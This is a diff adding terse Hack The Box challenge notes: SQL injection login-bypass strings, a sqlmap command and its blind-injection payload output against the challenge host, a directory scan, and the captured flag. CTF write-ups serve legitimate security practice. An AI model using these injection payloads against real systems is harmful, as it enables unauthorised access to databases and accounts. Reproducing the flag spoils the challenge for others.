@@ -1,0 +1,35 @@
+1. SQL Injection
+
+username= ' OR 1=1--
+password= ' OR 1=1--
+
+http://docker.hackthebox.eu:44399/panel.php?info=home
+
+sqlmap -u "http://docker.hackthebox.eu:44399/panel.php?info=home" --data="username=%27+OR+1%3D1--&password=%27+OR+1%3D1--" --dbms=mysql --dbs --time-sec=50
+
+
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND 1452=1452 AND 'xOnO'='xOnO
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=' OR 1=1--&password=' OR 1=1--' AND SLEEP(50) AND 'wIvu'='wIvu
+
+
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 8.0.0 (MariaDB fork)
+
+
+
+
+
+---- Scanning URL: http://docker.hackthebox.eu:44399/ ----
++ http://docker.hackthebox.eu:44399/index.php (CODE:200|SIZE:673)              
++ http://docker.hackthebox.eu:44399/server-status (CODE:403|SIZE:311)          
+                                                                      
+2. Directory Enumeration
+http://docker.hackthebox.eu:44399/panel.php?info=flag
+HTB{Map_Th3_Pl4n3t}
